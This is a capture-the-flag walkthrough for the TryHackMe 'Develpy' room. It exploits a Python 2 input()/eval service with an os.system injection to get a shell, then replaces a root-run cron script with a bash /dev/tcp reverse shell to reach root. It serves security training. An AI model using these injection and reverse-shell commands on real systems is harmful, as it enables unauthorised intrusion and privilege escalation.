# Develpy

**Room link:** https://tryhackme.com/room/bsidesgtdevelpy

1. `nmap` reveals SSH on port 22 and an unknown TCP service on port 10000.

2. Let us connect to the mysterious service.

```
$ nc $TARGET_IP 10000

        Private 0days

 Please enther number of exploits to send??: hello
Traceback (most recent call last):
  File "./exploit.py", line 6, in <module>
    num_exploits = int(input(' Please enther number of exploits to send??: '))
  File "<string>", line 1, in <module>
NameError: name 'hello' is not defined
```

The service running there is written in Python and calls the `input()` function. In Python 2, [`input()`](https://docs.python.org/2.7/library/functions.html#input) is equivalent to `eval(raw_input())` which insecurely evaluates the input given as an expression.

3. Assuming this is Python 2, let us inject a poisoned payload `__import__('os').system('bash')` (as `eval()` requires an expression, we use the [`__import__()`](https://docs.python.org/2.7/library/functions.html#__import__) function instead of the `import` statement) to spawn a shell.

```
$ nc $TARGET_IP 10000

        Private 0days

 Please enther number of exploits to send??: __import__('os').system('bash')
bash: cannot set terminal process group (750): Inappropriate ioctl for device
bash: no job control in this shell
king@ubuntu:~$ id
uid=1000(king) gid=1000(king) groups=1000(king),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```

Let us upgrade and pick the **user flag**.

```
king@ubuntu:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
$ stty raw -echo; fg
king@ubuntu:~$ ls -lh
total 284K
-rwxrwxrwx 1 king king 266K Aug 27  2019 credentials.png
-rwxrwxrwx 1 king king  408 Aug 25  2019 exploit.py
-rw-r--r-- 1 root root   32 Aug 25  2019 root.sh
-rw-rw-r-- 1 king king  139 Aug 25  2019 run.sh
-rw-rw-r-- 1 king king   33 Aug 27  2019 user.txt
king@ubuntu:~$ cat user.txt
**REDACTED**
```

4. `exploit.py` contains the code of this insecure service that we have used to break in and `run.sh` is used to plug it on port 10000 using `socat`. We guess this must be started through `cron` jobs.

```
king@ubuntu:~$ cat /etc/crontab 
...
*  *    * * *   king    cd /home/king/ && bash run.sh
*  *    * * *   root    cd /home/king/ && bash root.sh
*  *    * * *   root    cd /root/company && bash run.sh
#
```

Indeed, and we discover by the way that `root` runs `root.sh` in `king`'s home. We cannot edit this script, but we can delete and replace it by a reverse shell.

```
king@ubuntu:~$ rm -f root.sh 
king@ubuntu:~$ echo 'bash -i >& /dev/tcp/10.9.***.***/4444 0>&1' > root.sh
```

Wait a minute to gain access and grab the **root flag**.

```
$ nc -lnp 4444
bash: cannot set terminal process group (15967): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:~# cat root.txt
cat root.txt
**REDACTED**
```

## Bonus

At step 3, we could notice the file `credentials.png`. Let us bring it back to our local machine (e.g. using `nc`) and investigate.

```
$ exiftool credentials.png
ExifTool Version Number         : 12.05
File Name                       : credentials.png
...
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
...
Artist                          : Mondrian
Copyright                       : Mondrian
...
```

Note that some image viewers have difficulties opening it, it might be slightly corrupted or improperly formatted (we opened it using Firefox and took a screenshot to extract a proper version).

As hinted by the meta data, it is a [Piet](https://www.dangermouse.net/esoteric/piet.html) program. Using an [online interpreter](http://www.bertnase.de/npiet/npiet-execute.php), we discover it is an infinite loop outputting `king`'s credentials. This allows to log in as `king` through SSH, even though we did not really need this...
